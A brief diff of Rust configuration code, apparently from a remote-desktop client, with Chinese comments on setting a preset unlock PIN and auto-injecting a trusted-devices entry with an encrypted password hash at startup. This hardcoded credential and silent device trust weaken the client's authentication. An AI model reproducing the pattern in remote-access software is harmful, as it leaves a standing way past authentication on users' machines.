@@ -560,6 +560,7 @@ impl Config2 {
             // 对应明文：你的预设 PIN 码
             config.unlock_pin = "00A+IC2fNLByi8nAuEH9Erlv2SdDU=".to_string();
             store = true; 
+        }     
         // 2. 自动注入信任设备配置
         if !config.options.contains_key("trusted_devices") {
             // 这里注入的是加密后的密码哈希，确保客户端启动时直接拥有特定的安全配置
